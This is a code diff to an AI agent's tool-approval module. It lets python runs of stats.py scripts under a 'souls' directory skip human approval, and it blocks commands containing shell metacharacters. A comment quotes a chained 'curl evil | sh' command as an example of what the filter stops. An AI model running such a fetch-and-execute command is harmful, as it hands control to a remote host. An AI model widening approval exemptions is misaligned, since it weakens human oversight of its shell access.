@@ -71,8 +71,28 @@ const APPROVAL_GATED_NAMES = new Set(
  * Decide whether this concrete call needs a human. Schema flag wins (always
  * gated); otherwise the tool's rule inspects the arguments (studio compat).
  */
+// A human is not needed for a pure analysis script: `python3 <souls>/<task>/
+// scripts/stats.py <file>` only reads the target and prints numbers. The check
+// is deliberately narrow — the script must live under the souls tree, the
+// interpreter must be python, and any shell metacharacter (; | & > < $ `) or a
+// newline disqualifies the whole command, so a chained `; curl evil | sh` can
+// never ride on the allowlist.
+function isReadOnlyShell(args) {
+  const cmd = String((args && args.command) || '').trim()
+  if (!cmd || /[;|&<>$`\n]/.test(cmd)) return false
+  const m = /^(?:python3|python)\s+(\S+)(?:\s.*)?$/.exec(cmd)
+  if (!m) return false
+  const target = m[1]
+  if (!/\/scripts\/stats\.py$/.test(target)) return false
+  const real = realOrSelf(target)
+  const root = realOrSelf(SOULS_DIR) + path.sep
+  return real.startsWith(root) && real.endsWith('/scripts/stats.py')
+}
+
 function needsApproval(name, args) {
   if (name === 'pse-review') return false
+  // Read-only analysis scripts: stats.py under the souls tree only.
+  if (name === 'shell' && isReadOnlyShell(args)) return false
   if (GATED_SCHEMA_NAMES.includes(name)) return true
   const rule = APPROVAL_RULES.get(name)
   return rule ? !!rule(args || {}) : false
@@ -709,5 +729,5 @@ function capabilities() {
   ].join('\n')
 }
 
-module.exports = { BUILTIN_TOOLS, BUILTIN_NAMES, ALL_SCHEMA_NAMES, GATED_SCHEMA_NAMES, APPROVAL_GATED_NAMES, needsApproval, AGENT_TOOL_ALLOW,
+module.exports = { BUILTIN_TOOLS, BUILTIN_NAMES, ALL_SCHEMA_NAMES, GATED_SCHEMA_NAMES, APPROVAL_GATED_NAMES, needsApproval, isReadOnlyShell, AGENT_TOOL_ALLOW,
                    executeBuiltinTool, normalizeToolError, normalizeArgs, capabilities }
